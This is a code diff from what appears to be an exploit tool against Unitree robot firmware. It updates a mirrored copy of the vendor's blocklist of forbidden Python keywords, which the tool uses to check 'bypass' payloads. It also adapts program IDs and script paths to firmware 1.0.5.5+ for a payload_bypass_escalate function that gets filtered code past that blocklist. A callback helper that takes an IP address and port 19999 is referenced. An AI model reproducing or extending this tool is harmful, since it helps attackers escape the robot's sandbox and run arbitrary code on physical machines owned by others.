@@ -107,6 +107,7 @@ esac
 
 
 PROGACTUATOR_ILLEGAL_KEYWORDS = [
+    # --- original 1.0.4.5 blocklist ---
     "import", "exit", "sys", "eval", "exec", "getattr", "setattr",
     "delattr", "globals", "locals", "requests", "vars", "__dict__",
     "sys.modules", "subprocess", "pty", "fcntl", "resource",
@@ -143,6 +144,19 @@ PROGACTUATOR_ILLEGAL_KEYWORDS = [
     "argv", "path", "uname", "system", "release", "uid", "euid",
     "gid", "egid", "getpwuid", "getgrgid", "getegid", "getgid",
     "geteuid", "getuid", "reload", "imp",
+    # --- added in 1.0.5.5 (firmware 1.1.14+) ---
+    "imp.load_module", "imp.load_source",
+    "os.system", "os.popen", "os.popen2", "os.popen3", "os.popen4",
+    "os.execl", "os.execle", "os.execlp", "os.execlpe", "os.getcwd",
+    "os.execv", "os.execve", "os.execvp", "os.execvpe",
+    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
+    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
+    "os.startfile", "os.chmod", "os.chown", "os.link", "os.symlink",
+    "os.remove", "os.unlink", "os.rmdir", "os.removedirs",
+    "os.rename", "os.replace", "os.truncate", "os.listdir", "os.scandir",
+    "os.walk", "os.fork", "os.kill", "os.killpg", "os.putenv", "os.unsetenv",
+    "os.setuid", "os.setgid", "os.seteuid", "os.setegid", "os.open",
+    "os.read", "os.write", "os.stat", "os.lstat", "os.fstat", "os.chdir",
 ]
 
 
@@ -155,6 +169,11 @@ def validate_bypass_payload(source_code):
         if kw in source_code:
             return False, kw
     return True, None
+
+
+def validate_uuid_format(uuid_str):
+    """Check if UUID meets 1.0.5.5+ requirements (exactly 10 digits)."""
+    return len(uuid_str) == 10 and uuid_str.isdigit()
 
 
 def _enc(s):
@@ -176,7 +195,8 @@ class WebRTCPayload:
 
     def __post_init__(self):
         if not self.program_uuid:
-            self.program_uuid = f"unleash_{int(time.time())}"
+            # Firmware 1.0.5.5+ (1.1.14+) requires exactly 10 digits.
+            self.program_uuid = str(int(time.time()))
 
 
 def _callback_snippet(callback_ip, callback_port=19999):
@@ -368,10 +388,7 @@ def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
     Use when you need filtered keywords (import/open/exec) but not execve.
     """
     uuid_val = str(int(time.time()))
-    script_path = (
-        f"/unitree/module/programming_actuator/programs"
-        f"/{uuid_val}/{uuid_val}.py"
-    )
+    script_path = f"/unitree/etc/programming/{uuid_val}.py"
     p = _enc(script_path)
     lines = unfiltered_code.split("\n")
     names = [f"_v{i}" for i in range(len(lines))]
